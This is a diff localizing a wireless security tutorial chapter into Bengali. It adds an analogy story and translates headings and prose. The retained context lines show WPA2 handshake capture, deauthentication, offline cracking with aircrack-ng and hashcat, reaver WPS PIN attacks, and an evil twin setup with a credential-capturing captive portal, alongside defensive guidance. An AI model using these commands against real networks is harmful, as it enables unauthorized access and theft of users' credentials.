@@ -1,9 +1,9 @@
 ---
 title: 'Wireless Security'
-subtitle: 'WPA2 handshake capture, WPS attacks, evil twin APs, deauthentication, and wireless network defense.'
+subtitle: 'WPA2 handshake capture, WPS আক্রমণ, evil twin AP, deauthentication এবং wireless নেটওয়ার্ক প্রতিরক্ষা।'
 chapter: 12
 level: 'intermediate'
-readingTime: '10 min'
+readingTime: '10 মিনিট'
 topics:
   [
     'wireless',
@@ -21,15 +21,23 @@ topics:
 	import Callout from '$lib/components/content/Callout.svelte';
 </script>
 
+## গল্পে বুঝি
+
+ফাতিমা আল-ফিহরির বাড়িতে একটা মজার অভ্যাস ছিল — সব ঘরোয়া আলাপ হতো উঠোনে রাখা একটা তারস্বরে লাউডস্পিকারে। কে কত টাকা জমিয়েছে, কার ঘরে কী গয়না আছে, দরজার ছিটকিনি কোথায় লুকানো — সব কথা মাইকে বলা হতো, আর গোটা পাড়া সেটা শুনতে পেত। শুধু তা-ই নয়, বাড়ির যে "পরিবার-দল" ছিল সেটাতে ঢোকার কোনো দরজার কোড ছিল না — পাশের বাড়ির যে কেউ চাইলেই দিব্যি ঢুকে বসে যেতে পারত, নিজেকে পরিবারের লোক বলে চালিয়ে দিতে পারত।
+
+একদিন ইবনে সিনা পাশ দিয়ে যেতে যেতে সব শুনে ফেললেন এবং ফাতিমাকে সাবধান করলেন। এরপর থেকে পরিবারের সবাই ঠিক করল — গুরুত্বপূর্ণ কথা আর খোলা মাইকে নয়, বরং শুধু পরিবারের লোকেরাই জানে এমন একটা গোপন সাংকেতিক ভাষায় বলা হবে, যাতে পাশের কেউ শুনলেও কিছু বুঝবে না। আর দলে ঢুকতে হলে একটা শক্ত গোপন পাসফ্রেজ বলতে হবে, যেটা আল-খোয়ারিজমি ছাড়া বাইরের কেউ জানে না। ব্যস, পাড়ার আড়িপাতা বন্ধ।
+
+এই গল্পটাই আসলে **wireless security**। Wi-Fi সিগন্যাল বাতাসে রেডিও তরঙ্গ হয়ে ছড়ায় — উঠোনের লাউডস্পিকারের মতোই, আশেপাশের যে কেউ সেটা রিসিভ করতে পারে; আর দরজার কোড ছাড়া দল মানে একটা open বা দুর্বল network, যেখানে যে কেউ ঢুকে পড়ে। গোপন সাংকেতিক ভাষা হলো শক্তিশালী encryption (WPA2/WPA3), আর শক্ত গোপন পাসফ্রেজ হলো একটা strong password — এই দুটো থাকলে আশেপাশের কেউ সিগন্যাল রিসিভ করলেও কিছু পড়তে বা network-এ ঢুকতে পারে না। বাস্তবে তাই ক্যাফে-এয়ারপোর্টের open Wi-Fi এড়িয়ে চলুন, বাধ্য হলে একটা VPN ব্যবহার করুন, আর নিজের router-এ সবসময় WPA2/WPA3 আর একটা লম্বা শক্ত password রাখুন।
+
 <Callout type="info">
 
-**Real-World Analogy**
+**বাস্তব জীবনের উদাহরণ**
 
-WiFi security is the lock on your front door — most people set it up once and forget it. WPA2 with a strong password is fine; WPA2 with "password123" is a screen door on a submarine.
+WiFi security হলো আপনার সদর দরজার তালা — বেশিরভাগ মানুষ একবার সেট করে ভুলে যায়। শক্তিশালী password সহ WPA2 ঠিক আছে; কিন্তু "password123" সহ WPA2 হলো সাবমেরিনের গায়ে একটা মশারি-দরজা।
 
 </Callout>
 
-## Wireless Attack Prerequisites
+## Wireless Attack-এর পূর্বশর্ত
 
 ```bash
 # Need a WiFi adapter that supports monitor mode and packet injection
@@ -70,7 +78,7 @@ sudo airodump-ng --bssid TARGET_BSSID --channel 6 --write capture wlan0mon
 
 ## WPA2 Handshake Capture
 
-WPA2 uses a 4-way handshake during authentication. Capturing it lets you crack it offline.
+WPA2 authentication-এর সময় একটি 4-way handshake ব্যবহার করে। এটি capture করলে আপনি offline-এ crack করতে পারবেন।
 
 ```bash
 # Start capturing on target network
@@ -88,7 +96,7 @@ sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
 # You now have: handshake-01.cap
 ```
 
-## Cracking WPA2 with Aircrack-ng
+## Aircrack-ng দিয়ে WPA2 Crack করা
 
 ```bash
 # Dictionary attack
@@ -98,7 +106,7 @@ aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
 aircrack-ng handshake-01.cap -e "NetworkName" -w /usr/share/wordlists/rockyou.txt
 ```
 
-## Cracking with Hashcat (Faster — GPU)
+## Hashcat দিয়ে Crack করা (দ্রুততর — GPU)
 
 ```bash
 # Convert .cap to hashcat format
@@ -117,7 +125,7 @@ hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l  # 8-char lowercase
 
 ## WPS Attacks
 
-WPS (WiFi Protected Setup) has a design flaw: the 8-digit PIN is validated in two halves, reducing guessing from 10^8 to 10^4 + 10^3 = 11,000 attempts.
+WPS (WiFi Protected Setup)-এর একটি ডিজাইন ত্রুটি আছে: 8-সংখ্যার PIN দুই ভাগে যাচাই করা হয়, ফলে অনুমানের সংখ্যা 10^8 থেকে কমে 10^4 + 10^3 = 11,000 চেষ্টায় দাঁড়ায়।
 
 ```bash
 # Check if WPS is enabled
@@ -140,7 +148,7 @@ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
 
 ## Evil Twin Attack
 
-Create a fake AP with the same name as the target — capture credentials from clients that connect:
+target-এর নামেই একটি নকল AP তৈরি করুন — যেসব client connect করে তাদের থেকে credentials capture করুন:
 
 ```bash
 # Method 1: hostapd-wpe (WPA Enterprise evil twin)
@@ -171,7 +179,7 @@ address=/#/10.0.0.1          # all DNS → attacker (captive portal)
 # Captive portal page captures credentials entered by victims
 ```
 
-## WPA3 and Modern Defenses
+## WPA3 এবং আধুনিক প্রতিরক্ষা
 
 ```
 WPA2 weaknesses:
@@ -216,7 +224,7 @@ sudo airodump-ng wlan0mon | grep "TargetSSID"
 # Multiple BSSIDs with same ESSID = possible evil twin attack in progress
 ```
 
-## Defense Recommendations
+## প্রতিরক্ষার সুপারিশ
 
 ```
 Network side:
